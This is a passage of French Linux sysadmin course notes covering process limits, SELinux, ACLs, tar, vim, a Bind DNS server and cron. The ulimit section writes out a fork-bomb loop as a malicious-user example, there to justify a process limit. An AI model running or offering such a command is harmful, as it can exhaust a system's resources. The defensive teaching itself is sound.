ulimit -u                  # Processus (soft)
ulimit -Hu                 # Processus (hard)
ulimit -n                  # Fichiers ouverts (soft)
ulimit -Hn                 # Fichiers ouverts (hard)
```

**Modifier limites session courante (temporaire) :**
```bash
ulimit -u 512              # Limiter processus à 512 (soft)
ulimit -n 2048             # Limiter fichiers ouverts à 2048

# ⚠️ Temporaire = perdu au logout
```

**Vérifier limites pour autre user :**
```bash
sudo su - username -c "ulimit -a"
```

### Fichiers associés

**Configuration :**
- `/etc/security/limits.conf` : Limites PAM (login, ssh, su)
- `/etc/security/limits.d/*.conf` : Configs modulaires (override limits.conf)

**Vérification processus actif :**
```bash
# Voir limites processus running
cat /proc/<PID>/limits

# Exemple nginx
cat /proc/$(pgrep nginx | head -1)/limits
# Affiche soft/hard pour tous types ressources
```

### Application des limites

**⚠️ Important :** Limites prennent effet à la **prochaine connexion** user.

**Workflow :**
1. Modifier `/etc/security/limits.conf`
2. User doit se **reconnecter** (logout/login ou reboot)
3. Vérifier avec `ulimit -a`

**Forcer rechargement sans logout (workaround) :**
```bash
# Via sudo su (charge nouveaux limits)
sudo su - username -c "command"
```

### Use cases professionnels

**1. Prévenir fork bombs :**
```bash
# Utilisateur malveillant : while true; do $0 & done
# Limiter processus évite saturation
student          hard    nproc           100
```

**2. Serveur web haute charge (nginx) :**
```bash
# Connexions simultanées = fichiers ouverts
www-data         soft    nofile          10000
www-data         hard    nofile          20000
```

**3. Database (MySQL/PostgreSQL) :**
```bash
mysql            soft    nofile          16384
mysql            hard    nofile          32768
```

**4. Environnements multi-tenant :**
```bash
# Isoler ressources par tenant
tenant1          hard    nproc           200
tenant2          hard    nproc           200
```

### Debugging limites

**Problème : "Cannot fork" ou "Too many open files"**

```bash
# 1. Vérifier limites actuelles
ulimit -a

# 2. Compter processus user actuel
ps -U username | wc -l

# 3. Augmenter limite si nécessaire
sudo vi /etc/security/limits.conf
# username  soft  nproc  2048

# 4. Reconnecter user
sudo pkill -u username   # Forcer logout (DANGER prod)
```

**Système complet (tous users) :**
```bash
# Compter processus système total
ps aux | wc -l

# Voir top consumers
ps aux --sort=-%cpu | head -10
```

### Commande découverte (Challenge 17)

**Recherche commande/config :**
```bash
# apropos : recherche man pages par mot-clé
apropos limit
# prlimit (1) - get and set process resource limits
# limits.conf (5) - configuration file for the pam_limits module

man limits.conf
# Trouve /etc/security/limits.conf
```

**Séquence découverte typique :**
1. `apropos keyword` → Liste commandes liées
2. `man command` → Lire description
3. `man -k config` → Trouver fichiers config
4. Tester sur fichier réel

---

## Module 18 : SELinux (Security-Enhanced Linux)

### Concepts clés

**SELinux** : Module de sécurité kernel Linux (Mandatory Access Control - MAC)
- Développé par NSA, intégré RHEL/CentOS/Fedora
- Contrôle accès basé sur **contextes de sécurité** (pas seulement permissions traditionnelles)
- Politique de moindre privilège : tout interdit par défaut, autorisations explicites

### Modes SELinux

| Mode | Description | Usage |
|------|-------------|-------|
| **Enforcing** | Active, bloque violations politique | Production sécurisée |
| **Permissive** | Active, log violations sans bloquer | Testing, audit |
| **Disabled** | Désactivé complètement | Testing initial, incompatibilité apps |

**Transition modes** :
- Runtime (temporaire) : `setenforce 0` (Permissive) / `setenforce 1` (Enforcing)
- Permanent (après reboot) : `/etc/selinux/config` → `SELINUX=disabled|permissive|enforcing`

### Installation packages

```bash
# Packages essentiels RHEL/CentOS
sudo yum install selinux-policy selinux-policy-targeted policycoreutils

# selinux-policy : Politique de sécurité de base
# selinux-policy-targeted : Politique ciblée (protège services spécifiques, reste en unconfined)
# policycoreutils : Outils gestion (setenforce, sestatus, semanage, restorecon)
```

**Alternative Debian/Ubuntu** :
```bash
sudo apt install selinux-basics selinux-policy-default policycoreutils
```

### Configuration

**Fichier principal** : `/etc/selinux/config` (ou lien symbolique `/etc/sysconfig/selinux`)

```bash
# This file controls the state of SELinux on the system.
# SELINUX= can take one of these three values:
#     enforcing - SELinux security policy is enforced.
#     permissive - SELinux prints warnings instead of enforcing.
#     disabled - No SELinux policy is loaded.
SELINUX=enforcing

# SELINUXTYPE= can take one of these values:
#     targeted - Targeted processes are protected,
#     minimum - Modification of targeted policy. Only selected processes are protected. 
#     mls - Multi Level Security protection.
SELINUXTYPE=targeted
```

**Modification** :
1. `sudo vi /etc/selinux/config`
2. Modifier `SELINUX=disabled` (ou `permissive`, `enforcing`)
3. Reboot pour appliquer (ou `setenforce` pour runtime)

### Commandes essentielles

```bash
# Vérifier statut
sestatus
# SELinux status:                 enabled
# Current mode:                   enforcing
# Mode from config file:          enforcing
# Policy version:                 31
# Policy from config file:        targeted

# Changer mode runtime (temporaire)
sudo setenforce 0    # Permissive
sudo setenforce 1    # Enforcing

# Obtenir mode actuel
getenforce           # Enforcing / Permissive / Disabled

# Voir contextes sécurité fichiers
ls -Z /var/www/html
# -rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 index.html

# Restaurer contextes par défaut
sudo restorecon -R /var/www/html

# Gérer booléens SELinux (switches on/off fonctionnalités)
getsebool -a                       # Liste tous booléens
setsebool httpd_can_network_connect on   # Autoriser Apache connexions réseau
setsebool -P httpd_can_network_connect on # Idem + persistant
```

### Types de politiques

| Type | Description | Use Case |
|------|-------------|----------|
| **targeted** | Protège services réseau (httpd, sshd, named), reste unconfined | Production standard (défaut RHEL) |
| **minimum** | Variation de targeted, moins de processus protégés | Serveurs spécialisés |
| **mls** | Multi-Level Security (classifications type militaire) | Environnements haute sécurité |

### Use cases professionnels

**Activation production web** :
1. Installer SELinux en mode `permissive`
2. Tester application pendant 1-2 semaines
3. Analyser logs (`/var/log/audit/audit.log`)
4. Ajuster booléens et contextes
5. Passer en mode `enforcing`

**Désactivation temporaire (troubleshooting)** :
```bash
# Test : app fonctionne avec SELinux off ?
sudo setenforce 0
# Tester app
# Si OK → problème SELinux contexte/booléen
# Sinon → autre cause
```

**Changement contexte fichier** :
```bash
# Problème : Apache ne peut pas lire fichier custom
ls -Z /custom/web/file.html
# -rw-r--r--. root root unconfined_u:object_r:default_t:s0 file.html

# Solution : changer contexte httpd
sudo semanage fcontext -a -t httpd_sys_content_t "/custom/web(/.*)?"
sudo restorecon -R /custom/web
```

### Debugging SELinux

**Problème typique** : Service bloqué par SELinux

```bash
# 1. Vérifier mode
sestatus

# 2. Tester en Permissive
sudo setenforce 0
# Service fonctionne ? → SELinux en cause

# 3. Analyser logs audit
sudo ausearch -m avc -ts recent
# type=AVC msg=audit(...): avc:  denied  { write } for  pid=1234 comm="httpd" ...

# 4. Installer outils analyse
sudo yum install setroubleshoot-server
# sealert : analyse logs, propose solutions

# 5. Obtenir recommandations
sudo sealert -a /var/log/audit/audit.log
# Suggère commandes pour corriger (setsebool, semanage, etc.)
```

### Fichiers importants

| Fichier/Dossier | Description |
|-----------------|-------------|
| `/etc/selinux/config` | Configuration principale |
| `/var/log/audit/audit.log` | Logs violations SELinux |
| `/etc/selinux/targeted/contexts/` | Définitions contextes |
| `/sys/fs/selinux/` | Système fichiers virtuel SELinux |

### Pitfalls

⚠️ **Désactivation sans reboot** : `setenforce 0` ≠ `SELINUX=disabled` (contextes toujours chargés)  
⚠️ **Re-activation après disabled** : Reboot obligatoire + relabeling complet filesystem (lent)  
⚠️ **Contextes perdus** : Copie fichiers hors arborescence standard → contexte `default_t` (bloquer services)  
⚠️ **Booléens non persistants** : `setsebool` sans `-P` → perdu au reboot

---

## Module 19 : ACL (Access Control Lists)

### Concepts clés

**ACL** : Permissions étendues au-delà du modèle UGO (User/Group/Other) standard Linux.
- Permet définir permissions **spécifiques par utilisateur/groupe** sur fichiers/dossiers
- Complète permissions traditionnelles (`chmod`)
- Stockée dans métadonnées filesystem (ext4, xfs)

### Différence UGO vs ACL

**Modèle UGO (traditionnel)** :
```bash
-rw-r--r-- 1 root root 1234 Jan 07 file.txt
# Owner: rw, Group: r, Other: r
```

Limites :
- 1 user (owner) + 1 groupe uniquement
- Impossible donner accès à user spécifique sans changer owner/group

**Modèle ACL (étendu)** :
```bash
# User alice : rw, User bob : r, Group devs : rw, Other : -
```

Avantages :
- Permissions granulaires multiples users/groupes
- Pas besoin changer ownership

### Commandes essentielles

```bash
# Afficher ACL
getfacl /path/to/file
# file: /path/to/file
# owner: root
# group: root
# user::rw-
# user:alice:rw-
# user:bob:r--
# group::r--
# group:devs:rw-
# mask::rw-
# other::---

# Définir ACL user
setfacl -m u:alice:rw /path/to/file
# -m : modify, u: = user, permissions r/w/x ou 0 (aucun)

# Définir ACL group
setfacl -m g:devs:rw /path/to/file

# Retirer accès spécifique
setfacl -m u:alice:0 /path/to/file

# Supprimer ACL user/group
setfacl -x u:alice /path/to/file

# Supprimer TOUTES les ACL
setfacl -b /path/to/file

# ACL récursives (dossier + contenu)
setfacl -R -m u:alice:rwx /path/to/dir

# ACL par défaut (appliquées aux nouveaux fichiers)
setfacl -d -m u:alice:rw /path/to/dir
```

### Syntaxe setfacl

**Format** : `setfacl -m {u|g}:{name}:{perms} file`

| Élément | Description |
|---------|-------------|
| `-m` | Modify (ajouter/modifier ACL) |
| `-x` | Remove (supprimer ACL spécifique) |
| `-b` | Remove all (supprimer toutes ACL) |
| `-R` | Récursif (dossier + sous-dossiers) |
| `-d` | Default (ACL par défaut pour nouveaux fichiers) |
| `u:name` | User ACL (name = username ou vide pour owner) |
| `g:name` | Group ACL (name = groupname ou vide pour owning group) |
| `perms` | Permissions : `r` (read), `w` (write), `x` (execute), `0` (aucun) |

### Mask ACL

**Mask** : Limite maximale effective pour users/groupes (sauf owner)

```bash
getfacl file
# user:alice:rwx   # ACL définie : rwx
# mask::r--        # Mask effective : r seulement
# effective:r--    # Alice a seulement 'r' (mask limite)
```

**Modifier mask** :
```bash
setfacl -m m::rwx /path/to/file
```

### Indicateur ACL

Fichiers avec ACL affichent `+` dans `ls -l` :

```bash
ls -l /etc/hosts
-rw-rw-r--+ 1 root root 1234 Jan 07 /etc/hosts
#         ↑ = ACL présentes
```

### Use cases professionnels

**Partage projet multi-utilisateurs** :
```bash
# Dossier partagé : devs peuvent rw, sysadmins rw, auditeurs r
setfacl -R -m g:devs:rw /var/projects/web
setfacl -R -m g:sysadmins:rw /var/projects/web
setfacl -R -m g:auditors:r /var/projects/web
setfacl -d -m g:devs:rw /var/projects/web   # Nouveaux fichiers héritent
```

**Restrictions utilisateur spécifique** :
```bash
# Bob ne doit pas accéder au fichier sensible (autres users OK)
setfacl -m u:bob:0 /etc/sensitive.conf
```

**Logs accessibles uniquement à monitoring user** :
```bash
setfacl -m u:prometheus:r /var/log/app.log
```

### Debugging ACL

**Problème : User ne peut pas accéder fichier malgré ACL** :

```bash
# 1. Vérifier ACL
getfacl /path/to/file
# Vérifier user présent + permissions correctes

# 2. Vérifier mask
# effective: peut être inférieure à ACL définie

# 3. Vérifier SELinux (si activé)
ls -Z /path/to/file
sestatus

# 4. Vérifier permissions parentes (traversée dossiers)
namei -l /path/to/file
# Tous dossiers parents doivent avoir 'x' pour user
```

### Fichiers filesystem

Vérifier support ACL :
```bash
# Vérifier mount options
mount | grep /dev/sda1
# /dev/sda1 on / type ext4 (rw,relatime,acl)
#                                      ↑ ACL activées

# Activer ACL sur filesystem (si désactivées)
sudo mount -o remount,acl /
# Ou modifier /etc/fstab
```

### Pitfalls

⚠️ **Copie fichiers** : `cp` sans `-p` perd ACL (utiliser `cp -a` ou `rsync -A`)  
⚠️ **Mask restrictive** : ACL définies mais mask limite effectif  
⚠️ **Default ACL oubliées** : Nouveaux fichiers n'héritent pas sans `-d`  
⚠️ **Filesystem incompatible** : NFS ancien, FAT, NTFS (pas support ACL natif Linux)

---

## Module 20 : Archives tar et compression

### Concepts clés

**tar** : Tape Archive - Outil d'archivage fichiers/dossiers (ne compresse pas par défaut)
- Combine multiples fichiers en un seul `.tar`
- Supporte compression intégrée (gzip, bzip2, xz)
- Standard Unix/Linux pour backups, distributions

### Syntaxe de base

```bash
tar [options] [archive.tar] [files/dirs]
```

**Options principales** :

| Option | Description |
|--------|-------------|
| `c` | Create archive |
| `x` | Extract archive |
| `t` | List contents (table of contents) |
| `v` | Verbose (afficher fichiers traités) |
| `f` | File (spécifier nom archive) |
| `z` | Compression gzip (.tar.gz) |
| `j` | Compression bzip2 (.tar.bz2) |
| `J` | Compression xz (.tar.xz) |
| `C` | Change directory (extraire dans dossier spécifique) |
| `r` | Append files to existing archive |
| `--exclude` | Exclure fichiers/patterns |

### Créer archives

**Archive non compressée** :
```bash
tar cvf archive.tar /path/to/dir
# c = create, v = verbose, f = file
```

**Archive compressée gzip** :
```bash
tar cvzf archive.tar.gz /path/to/dir
# z = gzip compression
```

**Archive compressée bzip2** (meilleure compression, plus lent) :
```bash
tar cvjf archive.tar.bz2 /path/to/dir
# j = bzip2
```

**Archive compressée xz** (meilleure compression, encore plus lent) :
```bash
tar cvJf archive.tar.xz /path/to/dir
# J = xz (majuscule)
```

**Archiver depuis répertoire courant** :
```bash
cd /var/log
tar cvf /home/user/logs.tar .
# . = contenu répertoire courant (pas le dossier lui-même)
```

**Archiver avec exclusions** :
```bash
tar cvzf backup.tar.gz /home/user --exclude='*.tmp' --exclude='cache/*'
```

### Extraire archives

**Extraction standard** :
```bash
tar xvf archive.tar
# x = extract, v = verbose, f = file
```

**Extraction compressée** (tar détecte compression automatiquement) :
```bash
tar xvf archive.tar.gz    # Gzip
tar xvf archive.tar.bz2   # Bzip2
tar xvf archive.tar.xz    # XZ
```

**Extraction dans dossier spécifique** :
```bash
tar xvf archive.tar -C /path/to/destination
# -C : change directory avant extraction
```

**Extraction fichier spécifique** :
```bash
tar xvf archive.tar path/in/archive/file.txt
```

### Lister contenu

```bash
tar tvf archive.tar
# t = table (list), v = verbose, f = file
# Affiche permissions, owner, size, date, fichiers
```

### Ajouter à archive existante

```bash
tar rvf archive.tar newfile.txt
# r = append (seulement archives non compressées)
```

### Use cases professionnels

**Backup logs système** :
```bash
sudo tar cvzf /backups/logs-$(date +%Y%m%d).tar.gz /var/log/
# Compression gzip, nom avec date
```

**Transfert projet via réseau** :
```bash
# Machine source
tar czf - /var/www/html | ssh user@remote 'tar xzf - -C /var/www/'
# - = stdout/stdin, compression à la volée
```

**Backup incrémental** (avec find) :
```bash
find /home/user -mtime -1 -type f | tar cvzf daily-backup.tar.gz -T -
# -T - : lire liste fichiers depuis stdin
```

**Extraction sélective** :
```bash
tar xvf backup.tar.gz --wildcards '*.conf'
# Extraire seulement fichiers .conf
```

### Compression séparée

**Alternative : tar puis compression** :
```bash
tar cvf archive.tar /path/to/dir
gzip archive.tar        # Produit archive.tar.gz
# Ou
bzip2 archive.tar       # Produit archive.tar.bz2
# Ou
xz archive.tar          # Produit archive.tar.xz
```

**Décompression séparée** :
```bash
gunzip archive.tar.gz   # Produit archive.tar
tar xvf archive.tar
```

### Comparaison compression

| Format | Extension | Compression | Vitesse | Usage |
|--------|-----------|-------------|---------|-------|
| **Gzip** | .tar.gz / .tgz | Moyenne | Rapide | Standard, équilibre perf/taille |
| **Bzip2** | .tar.bz2 | Meilleure | Moyen | Archives distribution, backups |
| **XZ** | .tar.xz | Excellente | Lent | Archives finales, bande passante limitée |

### Debugging

**Problème : Extraction échoue "file changed as we read it"** :
```bash
# Fichiers modifiés pendant archivage (logs actifs)
# Solution : snapshot ou arrêt temporaire service
sudo systemctl stop app.service
tar cvzf backup.tar.gz /var/log/app
sudo systemctl start app.service
```

**Problème : Archive trop grosse** :
```bash
# Vérifier taille avant compression
du -sh /path/to/dir

# Utiliser compression maximale xz
tar cvJf archive.tar.xz /path/to/dir

# Ou split archive
tar cvzf - /path/to/dir | split -b 100M - archive.tar.gz.part
# Reconstruction : cat archive.tar.gz.part* | tar xvzf -
```

### Permissions et ownership

**Préserver permissions** :
```bash
tar cvpf archive.tar /path/to/dir
# p = preserve permissions
```

**Restaurer avec ownership original** (root requis) :
```bash
sudo tar xvpf archive.tar
# Sans sudo : ownership change en user courant
```

### Pitfalls

⚠️ **Chemins absolus** : `tar cvf archive.tar /etc/hosts` stocke chemin absolu → extraction écrase fichiers système  
⚠️ **Solution** : Utiliser chemins relatifs ou `--strip-components`  
⚠️ **Append sur archive compressée** : Impossible (`tar: Cannot update compressed archives`)  
⚠️ **Extraction sans vérifier contenu** : Risque overwrite fichiers → toujours `tar tvf` avant `tar xvf`

---

## Module 21 : Manipulation texte avec vim

### Concepts clés

**vim** : Éditeur texte modal (commande / insertion / visuel)
- Omniprésent Unix/Linux (toujours disponible)
- Modes : Normal (navigation), Insert (édition), Visual (sélection), Command (commandes)
- Courbe apprentissage raide, productivité maximale après

### Modes vim

| Mode | Accès | Usage |
|------|-------|-------|
| **Normal** | `Esc` | Navigation, commandes (défaut au démarrage) |
| **Insert** | `i`, `a`, `o`, `I`, `A`, `O` | Édition texte |
| **Visual** | `v`, `V`, `Ctrl+v` | Sélection texte |
| **Command** | `:` (depuis Normal) | Commandes ex (save, quit, search/replace) |

### Commandes de base

**Ouverture/Sauvegarde/Quitter** :
```bash
vim file.txt           # Ouvrir fichier
:w                     # Write (sauvegarder)
:q                     # Quit
:wq  ou  :x            # Write + Quit
:q!                    # Quit sans sauvegarder (force)
:wq!                   # Write + Quit force (override read-only)
```

**Insertion** :
```
i      # Insert avant curseur
a      # Append après curseur
o      # Open new line below
I      # Insert début ligne
A      # Append fin ligne
O      # Open new line above
```

### Navigation

```
h j k l          # Gauche / Bas / Haut / Droite
w b              # Word forward / backward
0 $              # Début / fin ligne
gg G             # Début / fin fichier
123G  ou  :123   # Aller ligne 123
Ctrl+f  Ctrl+b   # Page down / up
```

### Édition texte

```
x        # Delete char sous curseur
dd       # Delete line
yy       # Yank (copy) line
p        # Paste après curseur
P        # Paste avant curseur
u        # Undo
Ctrl+r   # Redo
.        # Répéter dernière commande
```

### Recherche

```
/pattern       # Chercher forward
?pattern       # Chercher backward
n              # Next match
N              # Previous match
*              # Chercher mot sous curseur (forward)
#              # Chercher mot sous curseur (backward)
```

### Commandes Command Mode (ex)

**Suppression lignes** :
```vim
:d                  # Delete ligne courante
:10,20d             # Delete lignes 10 à 20
:g/pattern/d        # Delete toutes lignes contenant pattern
:g/\<word\>/d       # Delete lignes contenant mot exact (\< \> = word boundaries)
```

**Substitution** :
```vim
:s/old/new/         # Substituer 1ère occurrence ligne courante
:s/old/new/g        # Substituer toutes occurrences ligne courante
:%s/old/new/g       # Substituer toutes occurrences fichier (% = all lines)
:%s/old/new/gc      # Idem + confirmation chaque remplacement
:%s/\<old\>/new/g   # Substituer mot exact (word boundaries)
:10,20s/old/new/g   # Substituer lignes 10-20
```

**Exemples Certification Test Tâche 7** :
```vim
# Supprimer lignes contenant "following"
:g/\<following\>/d

# Remplacer "and" (exact) par "them"
:%s/\<and\>/them/g
```

### Sélection visuelle

```
v           # Visual mode (caractères)
V           # Visual line (lignes complètes)
Ctrl+v      # Visual block (colonnes)
# Puis : y (yank), d (delete), > (indent), < (unindent)
```

### Configuration

**Fichier** : `~/.vimrc`

```vim
" Numéros lignes
set number

" Indentation auto
set autoindent
set tabstop=4
set shiftwidth=4
set expandtab

" Recherche incrémentale
set incsearch
set hlsearch

" Syntax highlighting
syntax on

" Mouse support
set mouse=a
```

### Use cases professionnels

**Édition config serveur SSH** :
```bash
sudo vim /etc/ssh/sshd_config
# Chercher : /PermitRootLogin
# Modifier : i → yes → no → Esc
# Sauvegarder : :wq
```

**Suppression commentaires fichier** :
```vim
:%s/^#.*$//g          # Supprimer lignes commençant par #
:%s/\s*#.*$//g        # Supprimer commentaires fin ligne
:g/^$/d               # Supprimer lignes vides
```

**Modification masse colonnes** (Visual Block) :
```
Ctrl+v               # Visual block
Sélectionner colonne
I                    # Insert avant block
Taper texte
Esc Esc              # Applique à toutes lignes sélectionnées
```

### Debugging

**Problème : Coincé en mode Insert** :
```
# Appuyer Esc plusieurs fois
Esc Esc Esc
```

**Problème : Modifications non sauvegardées, vim refuse quitter** :
```
:q!       # Quitter sans sauvegarder
# Ou
:w!       # Forcer sauvegarde (si permissions OK)
```

**Problème : Fichier read-only** :
```
# Solution 1 : Sauvegarder ailleurs
:w /tmp/file.txt

# Solution 2 : Forcer write (si sudo)
:w !sudo tee %
# % = nom fichier courant, tee écrit avec sudo
```

### Pitfalls

⚠️ **`:wq` sans `!` sur read-only** : Échec silencieux → vérifier message vim  
⚠️ **Regex sans word boundaries** : `:%s/and/them/g` remplace "and" dans "command" → "commthem"  
⚠️ **Visual block Insert** : Requiert `I` (majuscule), `i` ne fonctionne pas  
⚠️ **Modifications multiples fichiers** : `:wqa` (write quit all) vs `:qa!` (quit all force)

---

## Module 22 : Bind DNS Server

### Concepts clés

**Bind** : Berkeley Internet Name Domain - Serveur DNS le plus utilisé Internet
- Résolution noms domaine → adresses IP (ex: google.com → 142.250.185.46)
- Autorité (authoritative) ou récursif (resolver)
- Package RHEL/CentOS : `bind`, service : `named`

### Installation

```bash
# RHEL/CentOS/Rocky
sudo yum install bind -y

# Debian/Ubuntu
sudo apt install bind9 -y
```

### Service named

**Gestion service** :
```bash
# Démarrer
sudo systemctl start named

# Arrêter
sudo systemctl stop named

# Redémarrer (recharger config)
sudo systemctl restart named

# Recharger config sans redémarrage
sudo rndc reload

# Activer au boot
sudo systemctl enable named

# Activer + démarrer immédiatement
sudo systemctl enable --now named

# Vérifier statut
sudo systemctl status named
```

### Fichiers configuration

| Fichier | Description |
|---------|-------------|
| `/etc/named.conf` | Configuration principale |
| `/var/named/` | Fichiers zones DNS |
| `/var/named/data/` | Fichiers cache |
| `/etc/resolv.conf` | Configuration résolution DNS client |

**Configuration minimale** `/etc/named.conf` :
```
options {
    listen-on port 53 { any; };
    listen-on-v6 port 53 { ::1; };
    directory   "/var/named";
    allow-query { any; };
    recursion yes;
};

zone "." IN {
    type hint;
    file "named.ca";
};

zone "example.com" IN {
    type master;
    file "example.com.zone";
    allow-update { none; };
};
```

### Types serveurs DNS

| Type | Description | Usage |
|------|-------------|-------|
| **Authoritative** | Source autoritaire zone DNS | Serveur DNS public domaine |
| **Recursive** | Résout requêtes en interrogeant autres DNS | DNS entreprise, FAI |
| **Forwarder** | Redirige requêtes vers autre DNS | Proxy DNS interne |

### Fichier zone exemple

`/var/named/example.com.zone` :
```
$TTL 86400
@   IN  SOA ns1.example.com. admin.example.com. (
        2024010701  ; Serial
        3600        ; Refresh
        1800        ; Retry
        604800      ; Expire
        86400 )     ; Minimum TTL

    IN  NS  ns1.example.com.
    IN  MX  10 mail.example.com.

ns1     IN  A   192.168.1.10
www     IN  A   192.168.1.20
mail    IN  A   192.168.1.30
ftp     IN  CNAME www.example.com.
```

### Commandes diagnostic

```bash
# Tester résolution DNS
nslookup google.com
dig google.com
host google.com

# Tester serveur DNS spécifique
dig @8.8.8.8 google.com

# Vérifier configuration named
sudo named-checkconf /etc/named.conf

# Vérifier zone file
sudo named-checkzone example.com /var/named/example.com.zone

# Logs bind
sudo journalctl -u named -f
sudo tail -f /var/log/messages | grep named
```

### Firewall configuration

```bash
# Autoriser DNS (port 53 UDP/TCP)
sudo firewall-cmd --permanent --add-service=dns
sudo firewall-cmd --reload

# Ou manuel
sudo firewall-cmd --permanent --add-port=53/udp
sudo firewall-cmd --permanent --add-port=53/tcp
sudo firewall-cmd --reload
```

### Use cases professionnels

**DNS interne entreprise** :
- Résolution noms machines internes (server01.corp.local)
- Split-horizon DNS (réponses différentes interne/externe)

**DNS caching** :
- Accélérer résolutions répétées (cache local)
- Réduire charge DNS autoritaires

### Debugging

**Problème : named ne démarre pas** :
```bash
# Vérifier syntaxe config
sudo named-checkconf

# Vérifier logs
sudo journalctl -xe -u named

# Vérifier permissions fichiers zones
ls -l /var/named/
# Doivent être readable par named user
```

**Problème : Résolution DNS échoue** :
```bash
# Tester depuis serveur
dig @localhost google.com

# Vérifier firewall
sudo firewall-cmd --list-all

# Vérifier SELinux (si activé)
sudo ausearch -m avc -c named
```

### Pitfalls

⚠️ **Serial zone non incrémenté** : Slaves ne répliquent pas modifications (utiliser date format YYYYMMDDnn)  
⚠️ **Recursion ouverte** : `allow-query { any; }; recursion yes;` → risque amplification DDoS  
⚠️ **Permissions fichiers zones** : Doivent être owned by `named:named` ou readable  
⚠️ **Forget reload** : Modifications config non appliquées sans `systemctl restart named` ou `rndc reload`

---

## Module 23 : Cron - Planification de tâches

### Concepts clés

**Cron** : Daemon Unix/Linux pour planifier l'exécution automatique de tâches (scripts, commandes) à intervalles définis.
- Package RHEL/CentOS : `cronie`, Service : `crond`
- Package Debian/Ubuntu : `cron`, Service : `cron`
- Fichiers utilisateur : `/var/spool/cron/` (ou `/var/spool/cron/crontabs/`)
- Fichiers système : `/etc/crontab`, `/etc/cron.d/`, `/etc/cron.{hourly,daily,weekly,monthly}/`

**Use cases** :
- Backups automatiques (quotidiens, hebdomadaires)
- Rotation logs (logrotate)
- Monitoring système (checks périodiques)
- Maintenance bases de données (vacuum, optimisations)
- Scripts nettoyage (fichiers temporaires)

### Installation et service

```bash
# RHEL/CentOS/Rocky
sudo yum install cronie -y
sudo systemctl enable --now crond

# Debian/Ubuntu
sudo apt install cron -y
sudo systemctl enable --now cron

# Vérifier statut
sudo systemctl status crond   # RHEL
sudo systemctl status cron    # Debian

# Logs cron
sudo journalctl -u crond -f
sudo tail -f /var/log/cron     # RHEL
sudo tail -f /var/log/syslog | grep CRON  # Debian
```

### Syntaxe crontab

**Format ligne cron** :
```
┌───────────── minute (0-59)
│ ┌─────────── heure (0-23)
│ │ ┌───────── jour du mois (1-31)
│ │ │ ┌─────── mois (1-12)
│ │ │ │ ┌───── jour de la semaine (0-6, 0=dimanche, 7=dimanche aussi)
│ │ │ │ │
* * * * * commande_à_exécuter
```

**Opérateurs** :

| Opérateur | Description | Exemple |
|-----------|-------------|---------|
| `*` | Toutes les valeurs | `* * * * *` = chaque minute |
| `,` | Liste valeurs | `0,30 * * * *` = minutes 0 et 30 |
| `-` | Plage valeurs | `0 9-17 * * *` = 9h à 17h |
| `/` | Diviseur (pas/intervalle) | `*/5 * * * *` = toutes les 5 minutes |

**Exemples pratiques** :

```bash
# Toutes les 5 minutes
*/5 * * * * /path/to/script.sh

# Tous les jours à 2h30
30 2 * * * /usr/local/bin/backup.sh

# Toutes les heures (minute 0)
0 * * * * /usr/bin/check_disk.sh

# Lundi à vendredi à 9h00
0 9 * * 1-5 /home/user/morning_report.sh

# Dimanche à minuit
0 0 * * 0 /usr/local/bin/weekly_cleanup.sh

# Premier jour du mois à 1h00
0 1 1 * * /usr/local/bin/monthly_billing.sh

# Toutes les 4 heures
0 */4 * * * /usr/bin/monitoring.sh

# Minutes 0,15,30,45 de chaque heure
0,15,30,45 * * * * /usr/local/bin/quarter_hour_task.sh

# Lundi et vendredi à 17h30
30 17 * * 1,5 /home/user/end_of_week.sh
```

**Chaînes spéciales** (macros) :

| Macro | Équivalent | Description |
|-------|------------|-------------|
| `@reboot` | - | Au démarrage système |
| `@yearly` ou `@annually` | `0 0 1 1 *` | 1er janvier 0h00 |
| `@monthly` | `0 0 1 * *` | 1er jour du mois 0h00 |
| `@weekly` | `0 0 * * 0` | Dimanche 0h00 |
| `@daily` ou `@midnight` | `0 0 * * *` | Chaque jour 0h00 |
| `@hourly` | `0 * * * *` | Chaque heure (minute 0) |

**Exemples macros** :
```bash
@daily /usr/local/bin/daily_backup.sh
@reboot /usr/local/bin/startup_script.sh
@hourly /usr/bin/log_rotation.sh
```

### Commandes crontab

```bash
# Éditer crontab utilisateur courant
crontab -e

# Lister crontab utilisateur courant
crontab -l

# Éditer crontab utilisateur spécifique (root requis)
sudo crontab -e -u username

# Lister crontab utilisateur spécifique
sudo crontab -l -u username

# Supprimer TOUTE la crontab (DANGER, pas de confirmation)
crontab -r

# Supprimer avec confirmation
crontab -i -r

# Remplacer crontab par fichier
crontab /path/to/crontab_file

# Backup crontab
crontab -l > ~/crontab_backup.txt
```

### Variables d'environnement

Cron exécute jobs dans environnement minimal (pas `.bashrc`, `.profile`).

**Variables communes** :
```bash
# Définir PATH (début crontab)
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Définir SHELL
SHELL=/bin/bash

# Définir email notifications (envoi stdout/stderr)
MAILTO=admin@example.com

# Désactiver emails
MAILTO=""

# Exemple complet
PATH=/usr/local/bin:/usr/bin:/bin
SHELL=/bin/bash
MAILTO=admin@example.com

0 2 * * * /usr/local/bin/backup.sh
```

### Redirection sortie

**Redirections courantes** :

```bash
# Rediriger stdout vers fichier (écrase)
*/5 * * * * /script.sh > /var/log/script.log

# Rediriger stdout et stderr vers fichier
*/5 * * * * /script.sh > /var/log/script.log 2>&1

# Append stdout/stderr (ne pas écraser)
*/5 * * * * /script.sh >> /var/log/script.log 2>&1

# Supprimer toute sortie (silent)
*/5 * * * * /script.sh > /dev/null 2>&1

# Envoyer stderr à email, stdout vers fichier
*/5 * * * * /script.sh > /var/log/script.log
```

**Explication `2>&1`** :
- `2` : stderr (file descriptor 2)
- `>&1` : redirige vers stdout (file descriptor 1)
- Ordre important : `> file 2>&1` (stdout vers file, puis stderr vers stdout = file)

### Fichiers système cron

**`/etc/crontab`** : Crontab système (format étendu avec user) :
```bash
# /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# Format : min hour day month weekday user command
0 2 * * * root /usr/local/bin/system_backup.sh
30 3 * * 0 root /usr/local/bin/weekly_maintenance.sh
```

**`/etc/cron.d/`** : Fichiers cron additionnels (même format que `/etc/crontab`) :
```bash
# /etc/cron.d/custom_task
SHELL=/bin/bash
PATH=/usr/local/bin:/usr/bin:/bin

0 */6 * * * root /usr/local/bin/monitoring.sh
```

**Dossiers exécution périodique** :
- `/etc/cron.hourly/` : Scripts exécutés chaque heure
